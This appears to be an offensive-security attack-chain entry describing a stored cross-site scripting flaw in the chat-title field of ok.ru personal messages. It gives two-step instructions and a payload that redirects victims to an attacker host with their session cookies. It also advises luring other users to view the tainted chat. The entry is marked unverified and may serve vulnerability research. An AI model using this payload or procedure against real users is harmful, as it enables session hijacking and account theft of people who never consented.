---
id: ac-stored-xss-okru-chat-title
tags:
  - xss
  - stored-xss
  - web
  - javascript
  - session-hijacking
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2024-10-01T00:00:00Z'
procedures:
  - '[[procedures/Inject-Malicious-Payload-into-okru-Chat-Title]]'
  - '[[procedures/Trigger-Stored-XSS-Execution-in-okru-Messages]]'
step_count: 2
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:38.394Z'
description: >-
  A multi-step attack exploiting a Stored XSS vulnerability in the chat title
  feature of ok.ru personal messages, allowing arbitrary JavaScript execution in
  victims' browsers.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored XSS in ok.ru Chat Title for Arbitrary JavaScript Execution

Multi-stage attack chain demonstrating a complete attack workflow exploiting a Stored XSS vulnerability in the personal messages chat title on ok.ru.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Payload Injection] --> B[Victim Access]
    B --> C[JavaScript Execution]
    C --> D[Data Theft or Hijacking]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser with developer tools (e.g., Chrome DevTools)
- Access to an ok.ru account

### Target Environment

- Web platform
- ok.ru messaging service at https://ok.ru/messages
- No specific ports or services beyond standard HTTPS (443)

### Initial Access Requirements

- Valid ok.ru user account for injection
- Ability to create or participate in a personal message chat
- Victim must view the affected chat (e.g., social engineering to lure them)

## Detailed Attack Procedures

### Step 1: Payload Injection
procedure: [[procedures/Inject-Malicious-Payload-into-okru-Chat-Title]]

**Objective**: Inject a malicious JavaScript payload into the chat title field, which is stored without sanitization.

**Instructions**: Navigate to https://ok.ru/messages, start a new personal message chat, and enter a payload like `<script>alert('XSS');</script>` or more advanced `<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>` in the chat title input field. Submit the chat to store the payload.

**Expected Output**: The chat is created with the tainted title visible in the messages list.

**Success Indicators**:
- Payload appears unsanitized in the chat title when viewing the messages page.
- No immediate errors or blocking during submission.

### Step 2: Trigger Execution
procedure: [[procedures/Trigger-Stored-XSS-Execution-in-okru-Messages]]

**Objective**: Cause the stored payload to execute JavaScript in the victim's browser when they access the messages page.

**Instructions**: Lure the victim (another ok.ru user) to open the personal messages at https://ok.ru/messages. Upon loading the affected chat, the title renders the payload, executing the script in their browser context.

**Expected Output**: JavaScript runs, e.g., alert popup or cookie exfiltration to attacker's server.

**Success Indicators**:
- Victim's browser executes the payload (observable via alert or network requests to attacker's domain).
- Potential session hijacking or data theft confirmed by stolen cookies or actions performed.

## Attack Chain Summary

### Key Achievements

1. Successful storage of malicious script in chat title without sanitization.
2. Arbitrary JavaScript execution in victim browsers viewing the chat.
3. Enablement of client-side attacks like session theft or phishing.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2024-10-01T00:00:00Z*
